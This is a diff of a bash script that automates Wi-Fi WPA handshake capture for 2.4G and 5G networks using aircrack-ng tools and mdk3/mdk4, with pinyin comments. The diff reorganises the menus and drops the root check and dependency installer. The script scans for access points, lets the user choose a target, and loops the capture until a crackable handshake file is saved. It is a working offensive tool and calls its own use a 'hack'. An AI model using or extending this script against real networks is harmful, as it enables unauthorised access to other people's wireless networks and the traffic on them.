@@ -14,69 +14,6 @@
 work_dir=$(dirname $(realpath $0))/temp_aireplay
 result_dir=$(dirname $(realpath $0))/result
 
-#pan duan shi fou root yon hu yun xing
-if [ "${UID}" != "0" ]; then
-	echo -e "\033[31mPermission denied, please run this script as root.\033[0m"
-	exit 1
-fi
-
-#an zhuang yi lai ruan jian function
-install_dependent_software() {
-apt update
-if [ $? -ne 0 ]; then
-	echo -e "\033[31mnetwork error\033[0m"
-	exit 2
-fi
-apt install $1 -y
-if [ $? -ne 0 ]; then
-	echo -e "\033[31mnetwork error\033[0m"
-	exit 3
-fi
-}
-
-#pan  duan  shi  fou  an zhuang  le  yi  lai  ruan  jian
-for i in mdk3 mdk4 airmon-ng airodump-ng xterm dos2unix cowpatty aireplay-ng
-do
-	type ${i} >/dev/null 2>&1
-	exit_code=$?
-	if [ ${exit_code} -eq 0 ]; then
-		echo -e "${i}.....................\033[32mOK\033[0m"
-	else
-		echo -e "${i}.....................\033[33mInstalling\033[0m"
-		case ${i} in
-			mdk3)
-				install_dependent_software mdk3
-				;;
-			mdk4)
-				install_dependent_software mdk4
-				;;
-			airmon-ng)
-				install_dependent_software aircrack-ng
-				;;
-			airodump-ng)
-				install_dependent_software aircrack-ng
-				;;
-			aireplay-ng)
-				install_dependent_software aircrack-ng
-				;;
-			xterm)
-				install_dependent_software xterm
-				;;
-			dos2unix)
-				install_dependent_software dos2unix
-				;;
-			cowpatty)
-				install_dependent_software cowpatty
-				;;
-			*)
-				echo -e "\033[31mUknown error..\033[0m"
-				exit 4
-				;;
-		esac
-	fi
-	sleep 0.1
-done
-
 #pan duan work_dir shi  fou  cun  zai
 if [ ! -d ${work_dir} ];then
 	mkdir ${work_dir} -p
@@ -86,7 +23,9 @@ if [ ! -d ${result_dir} ];then
 	mkdir ${result_dir} -p
 fi
 
-#======================xian shi  wlan0 info function============================
+#===========================================================================================================================================
+#======================                               xian shi  wlan0 info function                             ============================
+#===========================================================================================================================================
 function show_interface_list() {
 #bao cun list to file
 rm -rf ${work_dir}/interface_list.txt >/dev/null 2>&1
@@ -109,7 +48,10 @@ while IFS=, read -r if_num if_name if_chipest; do
 done < "${work_dir}/interface_list.txt"
 }
 
-#=======================select wlan card=======================================
+#===========================================================================================================================================
+#======================                                select wlan card function                             ===============================
+#===========================================================================================================================================
+function select_interface() {
 clear
 show_interface_list
 echo -ne "\033[33mPlease select one interface: \033[0m"
@@ -179,19 +121,11 @@ else
 	echo -e "\033[33mThere is no such device ${wlan_card}, please make sure that you plug in the device and work normally\033[0m"
 	exit 7
 fi
-
-#xuan zhe gon ji mode
-handshake_menu() {
-cat <<EOF
-Select one type what you want to handshake
-************************************
-1.        2.4G                     *
-2.        5G                       *
-************************************
-EOF
 }
 
-#sao miao all ap function
+#===========================================================================================================================================
+#========================                             sao miao all ap function                               ===============================
+#===========================================================================================================================================
 scan_all_ap() {
 for i in 1
 do
@@ -213,7 +147,9 @@ do
 done
 }
 
-#=============chai fen  server_list and client_list function==============
+#===========================================================================================================================================
+#================                             chai fen  server_list and client_list function                               =================
+#===========================================================================================================================================
 prepare_server_client_list() {
 rm -rf ${work_dir}/server_list.csv >/dev/null 2>&1
 rm -rf ${work_dir}/client_list.csv >/dev/null 2>&1
@@ -234,25 +170,36 @@ done < "${work_dir}/client_list.csv"
 sleep 3
 }
 
-#xian shi sao miao jie guo function
+#===========================================================================================================================================
+#====================                                   xian shi sao miao jie guo function                         =========================
+#===========================================================================================================================================
 display_result_info() {
-IFS=$'\n'
-a=1
-for i in $(cat ${work_dir}/server_list.csv|egrep --text -v "SSID,"|egrep --text -v "^$")
-do
-	temp_mac=$(echo ${i}|awk -F "," '{print $1}')
-	cat ${work_dir}/client.txt|grep --text ${temp_mac} >/dev/null 2>&1
-	client_stat=$?
-	if [ "${client_stat}" == "0" ]; then
-		echo -e "\033[33m[$a]\033[0m \033[32m$i\033[0m"
-	else
-		echo -e "\033[33m[$a]\033[0m $i"
-	fi
-	let a++
-done
+server_list_total=$(cat ${work_dir}/server_list.csv|egrep --text -v "SSID,"|egrep --text -v "^$"|wc -l)
+if [ ${server_list_total} -gt 0 ]; then
+	IFS=$'\n'
+	a=1
+	for i in $(cat ${work_dir}/server_list.csv|egrep --text -v "SSID,"|egrep --text -v "^$")
+	do
+		temp_mac=$(echo ${i}|awk -F "," '{print $1}')
+		cat ${work_dir}/client.txt|grep --text ${temp_mac} >/dev/null 2>&1
+		client_stat=$?
+		if [ "${client_stat}" == "0" ]; then
+			echo -e "\033[33m[$a]\033[0m \033[32m$i\033[0m"
+		else
+			echo -e "\033[33m[$a]\033[0m $i"
+		fi
+		let a++
+	done
+else
+	echo -e "\033[31mNo network at the list, press [enter] to restart new hack\033[0m"
+	read -p ">" you_zl
+	handshake_menu
+fi
 }
 
-#handshake 2.4g and 5g function
+#===========================================================================================================================================
+#=====================                                  handshake 2.4g and 5g function                              ========================
+#===========================================================================================================================================
 handshake_bga() {
 #shao  miao   wifi  into  text wifi_info.txt
 echo "starting scan wifi info into ${work_dir}/dump-01.csv...."
@@ -373,7 +320,9 @@ done
 sleep 3
 }
 
-#check handshake fuction
+#===========================================================================================================================================
+#=======================                                    check handshake fuction                                 ========================
+#===========================================================================================================================================
 handshake_check() {
 if [ -z ${target_ap_name} ] || [ "${target_ap_name}" == "" ]; then
 	echo -e "\033[35mChecking handshake \033[34m[${result_dir}/${target_mac//:/-}-01.cap]\033[0m \033[35m....\033[0m"
@@ -402,7 +351,9 @@ else
 fi
 }
 
-#xian shi jie guo info function
+#===========================================================================================================================================
+#========================                                    xian shi jie guo info function                        =========================
+#===========================================================================================================================================
 display_cap_location() {
 if [ -z ${target_ap_name} ] || [ "${target_ap_name}" == "" ]; then
 	echo -e "\033[36mThe handshake cap is saved in [${result_dir}/${target_mac//:/-}-01.cap] \033[0m"
@@ -413,42 +364,60 @@ else
 fi
 }
 
-#function ru kou
-while true
-do
-	handshake_menu
-	read -p "Please select: " hand_type
-	case ${hand_type} in
-		1)
+#===========================================================================================================================================
+#===============================                               xuan zhe gon ji mode                       ==================================
+#===========================================================================================================================================
+handshake_menu() {
+echo -e "\033[33mSelect one type what you want to handshake\033[0m"
+echo -e "\033[36m************************************\033[0m"
+echo -e "\033[31m0.        return tool select\033[0m       \033[36m*\033[0m"
+echo -e "\033[36m************************************\033[0m"
+echo -e "\033[32m1.        2.4G\033[0m                     \033[36m*\033[0m"
+echo -e "\033[32m2.        5G\033[0m                       \033[36m*\033[0m"
+echo -e "\033[36m************************************\033[0m"
+read -p "Please select: " hand_type
+case ${hand_type} in
+	0)
+		clear
+		handshake_tool_menu
+		;;
+	1)
+		clear
+		select_interface
+		handshake_bga bg
+		handshake_check
+		exit_code=$?
+		while [ ${exit_code} -ne 0 ]
+		do
+			echo -e "\033[35mRestart handshake program and rechecking....\033[0m"
+			sleep 3
 			handshake_bga bg
 			handshake_check
 			exit_code=$?
-			while [ ${exit_code} -ne 0 ]
-			do
-				echo -e "\033[35mRestart handshake program and rechecking....\033[0m"
-				sleep 3
-				handshake_bga bg
-				handshake_check
-				exit_code=$?
-			done
-			display_cap_location
-			;;
-		2)
+		done
+		display_cap_location
+		;;
+	2)
+		clear
+		select_interface
+		handshake_bga a
+		handshake_check
+		exit_code=$?
+		while [ ${exit_code} -ne 0 ]
+		do
+			echo -e "\033[35Restart handshake program and rechecking....\033[0m"
+			sleep 3
 			handshake_bga a
 			handshake_check
 			exit_code=$?
-			while [ ${exit_code} -ne 0 ]
-			do
-				echo -e "\033[35Restart handshake program and rechecking....\033[0m"
-				sleep 3
-				handshake_bga a
-				handshake_check
-				exit_code=$?
-			done
-			display_cap_location
-			;;
-		*)
-			clear
-			;;
-	esac
-done
+		done
+		display_cap_location
+		;;
+	*)
+		clear
+		;;
+esac
+}
+
+#function ru kou
+handshake_menu
